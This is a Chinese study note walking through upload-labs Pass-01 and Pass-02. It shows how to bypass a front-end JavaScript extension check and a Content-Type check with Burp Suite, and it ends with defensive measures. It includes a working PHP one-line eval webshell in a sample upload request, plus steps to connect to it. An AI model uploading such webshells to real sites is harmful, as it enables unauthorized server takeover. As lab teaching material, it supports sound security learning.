---
{"dg-publish":true,"permalink":"/计算机相关技术知识库/05-Web安全/文件上传前端与 MIME 绕过/","title":"文件上传前端与 MIME 绕过","tags":["Web安全/文件上传"],"dg-note-properties":{"title":"文件上传前端与 MIME 绕过","created":"2026-10-19","tags":["Web安全/文件上传"],"aliases":["前端绕过","MIME 绕过","Pass-01","Pass-02"]}}
---


# 文件上传前端与 MIME 绕过

> [!warning] 合规声明
> 本文操作均在 upload-labs 靶场完成，仅用于授权教学与防御学习。

## 环境

- 靶场：upload-labs（Windows & Linux）
- 工具：Burp Suite
- 关卡：Pass-01、Pass-02

## 一、前端绕过（Pass-01）

### 现象

此关卡中，网站**只在客户端（浏览器）进行文件验证**。

上传名为 `1.php` 的文件，被提示"该文件不允许上传"。提示是**弹框**，说明前端使用了 JavaScript 检查文件后缀。

> [!important] 核心结论
> **前端验证等于没有验证。** 前端代码运行在攻击者完全可控的浏览器里，攻击者可以绕过、修改或直接跳过它。

### 绕过步骤

1. 打开 Burp Proxy，开启拦截
2. 选择一句话木马文件（如 `shell.php`），或准备一张写有一句话木马的图片
3. 上传时浏览器被前端 JS 拦截
4. 抓包后修改请求中的文件名，把扩展名改回 `.php`（或先以 `.jpg` 通过前端校验，再在请求中改为 `.php`）
5. 放行请求，文件成功上传
6. 访问上传后的脚本路径，使用蚁剑等工具连接

```http
POST /upload-labs/Pass-01/index.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: application/octet-stream

<?php @eval($_POST['mima']);?>
------WebKitFormBoundary--
```

> [!tip] 为什么能成功
> 服务端没有再做扩展名校验，前端 JS 被绕过后，`.php` 文件直接落到可执行目录。

## 二、MIME 绕过（Pass-02）

### 什么是 MIME

**MIME**（Multipurpose Internet Mail Extensions）是一种标准，用来表示文档、文件或字节流的性质和格式。

常见 MIME 类型：

| 文件类型 | MIME |
|---------|------|
| PNG 图片 | `image/png` |
| JPEG 图片 | `image/jpeg` |
| GIF 图片 | `image/gif` |
| 纯文本 | `text/plain` |
| HTML | `text/html` |
| JSON | `application/json` |
| PDF | `application/pdf` |
| 二进制流 | `application/octet-stream` |

### 现象

Pass-02 中，网站**服务端检测 `Content-Type`（MIME）**。

服务器在检测上传的图片时，可能只检查请求中的 MIME 类型。这类检测可以通过修改 MIME 绕过。

### 绕过步骤

1. 开启代理和 Burp 拦截
2. 选择一个 PHP 文件上传
3. 在 HTTP 包中把 `Content-Type` 修改为 `image/png`
4. 放行，上传成功

```http
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png
```

> [!warning] 只改 MIME 不是万能
> 这是典型的"信任客户端提交的 Content-Type"问题。服务端应根据**文件内容**（魔数）判断真实类型，而不是相信请求头。

## 防御要点

| 措施 | 说明 |
|------|------|
| 服务端校验 | 所有校验必须在服务端完成，前端校验只能提升体验 |
| 白名单扩展名 | 只允许业务需要的扩展名 |
| 校验真实类型 | 读取文件头 / 魔数，而不是只看 `Content-Type` |
| 重命名 | 上传后随机重命名，避免用户控制路径与扩展名 |
| 禁止执行 | 上传目录关闭脚本解析 |
| 二次渲染 | 图片重新编码，破坏潜在的脚本内容 |

## 相关笔记

- [[计算机相关技术知识库/05-Web安全/文件上传漏洞与一句话木马\|文件上传漏洞与一句话木马]] — 漏洞成因与一句话木马
- [[计算机相关技术知识库/05-Web安全/文件上传扩展名绕过\|文件上传扩展名绕过]] — 黑名单及解析绕过
- [[计算机相关技术知识库/05-Web安全/文件上传 00 截断\|文件上传 00 截断]] — 截断上传
- [[计算机相关技术知识库/05-Web安全/Webshell 管理工具\|Webshell 管理工具]] — 蚁剑连接
- [[计算机相关技术知识库/04-速查表/文件上传绕过速查\|文件上传绕过速查]] — 绕过手法速查
- [[计算机相关技术知识库/05-Web安全/Web 渗透测试概览\|Web 渗透测试概览]] — 渗透流程总览
